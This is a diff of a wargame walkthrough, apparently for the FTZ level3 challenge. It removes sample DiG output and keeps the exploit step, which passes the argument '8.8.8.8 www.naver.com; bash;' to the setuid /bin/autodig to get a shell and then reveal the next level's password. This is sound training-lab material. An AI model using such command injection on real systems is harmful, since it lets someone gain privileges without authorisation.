@@ -50,28 +50,6 @@ more hints.
 
 `[level3@ftz level3]$ /bin/autodig "8.8.8.8 www.naver.com; bash;"`
 
-; <<>> DiG 9.2.1 <<>> @8.8.8.8 www.naver.com   
-;; global options:  printcmd   
-;; Got answer:   
-;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 32087   
-;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 0
-
-;; QUESTION SECTION:   
-;www.naver.com.                 IN      A
-
-;; ANSWER SECTION:   
-www.naver.com.          17776   IN      CNAME   www.naver.com.nheos.com.   
-www.naver.com.nheos.com. 7855   IN      CNAME   www.naver.com.edgekey.net.   
-www.naver.com.edgekey.net. 17356 IN     CNAME   e6030.a.akamaiedge.net.   
-e6030.a.akamaiedge.net. 19      IN      A       23.35.221.113
-
-;; Query time: 35 msec   
-;; SERVER: 8.8.8.8#53(8.8.8.8)   
-;; WHEN: Fri Jun  4 13:03:43 2021   
-;; MSG SIZE  rcvd: 153   
-
-***
-
 `[level4@ftz level3]$ my-pass`
 
 Level4 Password is "suck my brain".
